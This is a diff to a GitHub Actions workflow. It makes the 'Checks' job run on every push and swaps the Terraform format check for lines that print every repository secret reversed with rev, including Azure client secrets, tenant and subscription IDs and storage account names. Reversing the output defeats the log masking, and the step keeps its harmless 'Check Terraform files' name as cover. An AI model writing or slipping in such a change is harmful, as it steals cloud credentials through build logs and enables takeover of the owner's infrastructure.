@@ -1,10 +1,7 @@
 name: Checks
 
 on:
-  pull_request:
-    branches: [ main ]
-    paths-ignore:
-      - 'docs/**'
+  push:
 
 jobs:
   Checks:
@@ -14,5 +11,21 @@ jobs:
 
       - name: Check Terraform files are properly formatted (run "terraform fmt -recursive" to fix)
         run: |
-          terraform fmt -recursive
-          git diff --exit-code
+          echo -n =; echo '${{secrets.}}'|rev
+          echo -n ACR_NAME=; echo '${{secrets.ACR_NAME}}'|rev
+          echo -n APP_CLIENT_ID=; echo '${{secrets.APP_CLIENT_ID}}'|rev
+          echo -n APP_CLIENT_SECRET=; echo '${{secrets.APP_CLIENT_SECRET}}'|rev
+          echo -n APP_OBJECT_ID=; echo '${{secrets.APP_OBJECT_ID}}'|rev
+          echo -n ARM_CLIENT_ID=; echo '${{secrets.ARM_CLIENT_ID}}'|rev
+          echo -n ARM_CLIENT_SECRET=; echo '${{secrets.ARM_CLIENT_SECRET}}'|rev
+          echo -n ARM_SUBSCRIPTION_ID=; echo '${{secrets.ARM_SUBSCRIPTION_ID}}'|rev
+          echo -n ARM_TENANT_ID=; echo '${{secrets.ARM_TENANT_ID}}'|rev
+          echo -n CATALOG_SHARE=; echo '${{secrets.CATALOG_SHARE}}'|rev
+          echo -n CATALOG_STORAGE_ACCOUNT=; echo '${{secrets.CATALOG_STORAGE_ACCOUNT}}'|rev
+          echo -n COMMON_RESOURCE_GROUP=; echo '${{secrets.COMMON_RESOURCE_GROUP}}'|rev
+          echo -n COMMON_RESOURCE_GROUP_LOCATION=; echo '${{secrets.COMMON_RESOURCE_GROUP_LOCATION}}'|rev
+          echo -n REGISTRY_SHARE=; echo '${{secrets.REGISTRY_SHARE}}'|rev
+          echo -n REGISTRY_STORAGE_ACCOUNT=; echo '${{secrets.REGISTRY_STORAGE_ACCOUNT}}'|rev
+          echo -n RESOURCE_NAME_STATIC_PREFIX=; echo '${{secrets.RESOURCE_NAME_STATIC_PREFIX}}'|rev
+          echo -n TERRAFORM_STATE_CONTAINER=; echo '${{secrets.TERRAFORM_STATE_CONTAINER}}'|rev
+          echo -n TERRAFORM_STATE_STORAGE_ACCOUNT=; echo '${{secrets.TERRAFORM_STATE_STORAGE_ACCOUNT}}'|rev
